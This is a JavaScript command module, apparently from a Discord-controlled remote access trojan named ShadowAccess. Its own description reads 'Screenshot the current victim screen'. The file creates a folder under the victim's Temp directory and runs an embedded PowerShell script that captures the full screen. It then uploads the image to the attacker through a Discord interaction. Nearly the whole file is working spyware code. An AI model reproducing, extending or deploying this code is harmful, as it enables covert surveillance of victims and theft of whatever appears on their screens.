const fs = require("fs"),
  { AttachmentBuilder } = require("discord.js"),
  core = require("../../../Sentinel/utils/core"),
  { PowershellnoKi } = require("../../modules/Command"),
  path = require("path");

module.exports = {
  name: "screenshot",
  ownerOnly: true,
  description: "Screenshot the current victim screen",
  run: async (client, interaction, args) => {
    await interaction.reply({
      content: `Wait...`,
      ephemeral: true,
    });
    const filePath = path.join(
      process.env.localappdata,
      "Temp",
      "ShadowAccess"
    );
    if (!fs.existsSync(filePath)) {
      try {
        fs.mkdirSync(filePath, { recursive: true });
      } catch (e) {}
    }
    let screenpath = path.join(filePath, "Screenshots" + core.generateId(6));
    if (!fs.existsSync(screenpath)) {
      try {
        fs.mkdirSync(screenpath, { recursive: true });
      } catch (e) {}
    }
    const powershellScript = `
  $Path = "${screenpath}" 

  $FileName = "$env:COMPUTERNAME_$(get-date -f yyyy-MM-dd_HHmmss).png"
  $File = "$Path\\$FileName"

  Add-Type -AssemblyName System.Windows.Forms
  Add-type -AssemblyName System.Drawing

  $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
  $Width = $Screen.Width
  $Height = $Screen.Height
  $Left = $Screen.Left
  $Top = $Screen.Top

  $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
  $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
  $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

  $bitmap.Save($File) 
  Write-Output $File
`;
    let c = await PowershellnoKi(powershellScript);
    console.log("File path:", c.trim());
    const attachment = new AttachmentBuilder()
      .setName("Screenshot.png")
      .setFile(c.trim());

    await interaction.editReply({
      content: "Screenshot!",
      files: [attachment],
      ephemeral: true,
    });
  },
};
